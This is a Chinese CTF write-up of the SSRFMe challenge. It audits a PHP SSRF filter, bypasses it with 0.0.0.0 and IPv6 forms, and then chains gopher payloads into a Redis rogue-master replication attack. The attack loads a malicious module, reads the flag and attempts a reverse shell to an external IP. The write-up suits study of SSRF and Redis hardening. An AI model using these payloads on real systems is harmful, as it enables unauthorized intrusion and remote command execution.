---
title: '[网鼎杯 2020 玄武组]SSRFMe'
date: 2024-10-22 16:00:07
tags:
      - redis主从复制
categories: 刷题笔记
---

### [网鼎杯 2020 玄武组]SSRFMe

网站直接给了源码

看来又是残酷的代码审计了

```
<?php
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
}
//ip2long — 将 IPV4 的字符串互联网协议转换成长整型数字
function safe_request_url($url)
{

    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();  // 创建新的 cURL 资源
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch); // 抓取 URL 并把它传递给浏览器
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);  // 关闭 cURL 资源，并且释放系统资源
        var_dump($output);
    }

}
if(isset($_GET['url'])){
    $url = $_GET['url'];
    if(!empty($url)){
        safe_request_url($url);
    }
}
else{
    highlight_file(__FILE__);
}
// Please visit hint.php locally.
?>

```

我们进行代码审计

check_inner_ip用于限制了只能使用http、https、gopher、dict这四个协议，然后通过parse_url获取的地址执行gethostbyname()函数，这个函数解析不了127.0.0.1，也防御了xip.io这类利用dns解析的方法。使用ip2long将ip地址转为整数，判断是否为内网网段，**防御了127.0.0.1/8**



**有个小知识点**

当处理

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/80e1a2d0a19f4d8e1679ef703e9b19d6.png)

curl和php_url_parse处理后最终的目标不一样

![image-20241028190908881](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410281909959.png)

当 `php_url_parse` 认为 `google.com` 为目标的同时，`curl` 认为 `evil.com:80` 是目标。

safe_request_url先用上一个函数判断,不符合即会开启curl会话,输入值

看到curl_exec也比较明确是ssrf了,代码最后提示要从本地端访问hint.php文件,那么绕过本地验证即可,方法也有很多,我这里使用

```
http://[0:0:0:0:0:ffff:127.0.0.1]//hint.php
或
http://0.0.0.0//hint.php
```

我们进入下一层

```
<?php
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
  highlight_file(__FILE__);
}
if(isset($_POST['file'])){
  file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
}
```

看到这个

```
 file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
```

我们就知道考file_put_contents的死亡绕过，[博客](https://xz.aliyun.com/t/8163)

好吧，尝试了一下考的不是这个

我们发现代码中出现了redispass is root

那考点就不是这，应该要结合redis



**redis主从复制**

```
主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。
```

所以我们这题的思路是，创建一个恶意的Redis服务器作为Redis主机（master），该Redis主机能够回应其他连接他的Redis从机的响应。有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过 slaveof 命令将目标Redis服务器设置为我们恶意Redis的Redis从机（slaver）。然后将恶意Redis主机上的exp同步到Reids从机上，并将dbfilename设置为exp.so。最后再控制Redis从机（slaver）加载模块执行系统命令即可。

我们先下两个工具

```
未授权访问 : 未启用认证功能或认证密码为空，用户可直接连接
授权访问 : 能通过弱口令认证或者直接知道认证密码访问到Redis服务器
```

```
https://github.com/n0b0dyCN/redis-rogue-server
redis-rogue-server，未授权使用，python3.5以上

https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server
Awsome-Redis-Rogue-Server，有授权使用
```

首先 工具一的exp.so需要复制到工具二的目录下，工具二才能使用

我们先开启主服务

```
# lport就是指定攻击机的ip和端口的，我们是内网穿透映射到虚拟机的1028端口
python3 redis_rogue_server.py -v -path exp.so -lport 1028

```

![image-20241028202033198](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410282020273.png)

然后利用gopher联动redis

**首先先设置备份路径**

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit

#上述payload的解码结果
gopher://0.0.0.0:6379/_auth root
config set dir /tmp/
quit

```

成功

![image-20241028202148107](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410282021145.png)

**然后生成一个exp.so文件，再设置主从关系（ip改为自己的服务器）**

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520ip%25201028%250d%250aquit


#上述payload的解码结果
gopher://0.0.0.0:6379/_auth root
config set dbfilename exp.so
slaveof ip 1028  
quit

```

返回四个ok

![image-20241028202606980](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410282026006.png)



linux服务器也一直在回显![image-20241028202624502](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410282026557.png)

**然后继续加载模块**

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520./exp.so%250d%250aquit

#上述payload的解码结果
gopher://0.0.0.0:6379/_auth root
module load ./exp.so
quit

```

得到三个ok

![image-20241028202714815](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410282027838.png)

最后关闭主从同步

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit

#上述payload的解码结果
gopher://0.0.0.0:6379/_auth root
slaveof NO ONE
quit

```

![image-20241028202751670](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410282027691.png)

返回三个ok

关闭后去看刚刚监听的地方会返回pong

![image-20241028202913312](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410282029341.png)

然后我们导出数据库（设置备份文件名字）

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520dump.rdb%250d%250aquit

#上述payload的解码结果
gopher://0.0.0.0:6379/_auth root
config set dbfilename dump.rdb
quit

```

返回三个ok

![image-20241028203047264](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410282030292.png)

### 方法一

rce获得**flag**

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit

#上述payload的解码结果
gopher://0.0.0.0:6379/_auth root
system.exec "cat /flag"
quit
```

![image-20241028203615854](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410282036881.png)

### 方法二

shell**反弹**（没弹出但有这个方法）

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.rev%252060.204.158.87%25206666%250d%250aquit

#上述payload的解码结果
gopher://0.0.0.0:6379/_auth root
system.rev 1.xx.xx.xx 6666
quit

```

### redis主从复制

主从复制是指将一台Redis主服务器的数据，复制到其他的Redis从服务器。前者称为主节点(master)，后者称为从节点(slave)；

主服务器可以进行读写操作，当发生写操作时自动将写操作同步给从服务器，而从服务器一般是只读，并接受主服务器同步过来写操作命令，然后执行这条命令。

![image-20241028204330708](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410282043760.png)

也就是说，所有的数据修改只在主服务器上进行，然后将最新的数据同步给从服务器，这样就使得主从服务器的数据是一致的。

建立主从复制，有3种方式：

1. 配置文件写入 `slaveof <master_ip> <master_port>`
2. redis-server启动命令后加入 `--slaveof <master_ip> <master_port>`
3. 连接到客户端之后执行：`slaveof <master_ip> <master_port>`

PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作

我们先在同一个机器开两个redis实例，一个端口为6379，一个端口为6380
        我们把master_ip设置为127.0.0.1，master_port为6380

```
root@kali:/usr/bin# redis-cli -p 6379
127.0.0.1:6379> SLAVEOF 127.0.0.1 6380
OK
127.0.0.1:6379> get test
(nil)
127.0.0.1:6379> exit
root@kali:/usr/bin# redis-cli -p 6380
127.0.0.1:6380> get test
(nil)
127.0.0.1:6380> set test "test"
OK
127.0.0.1:6380> get test
"test"
127.0.0.1:6380> exit
root@kali:/usr/bin# redis-cli -p 6379
127.0.0.1:6379> get test
"test"

os.system（ls）
```

我们明显看到数据同步了

### redis常用命令

```
set xz "Hacker"                     # 设置键xz的值为字符串Hacker
get xz                              # 获取键xz的内容
SET score 857                       # 设置键score的值为857
INCR score                          # 使用INCR命令将score的值增加1
GET score                           # 获取键score的内容
keys *                              # 列出当前数据库中所有的键
config set protected-mode no        # 关闭安全模式
get anotherkey                      # 获取一个不存在的键的值
config set dir /root/redis          # 设置保存目录
config set dbfilename redis.rdb     # 设置保存文件名
config get dir                      # 查看保存目录
config get dbfilename               # 查看保存文件名
save                                # 进行一次备份操作
flushall                            # 删除所有数据
del key                             # 删除键为key的数据
slaveof ip port                     # 设置主从关系
redis-cli -h ip -p 6379 -a passwd   # 外部连接

```

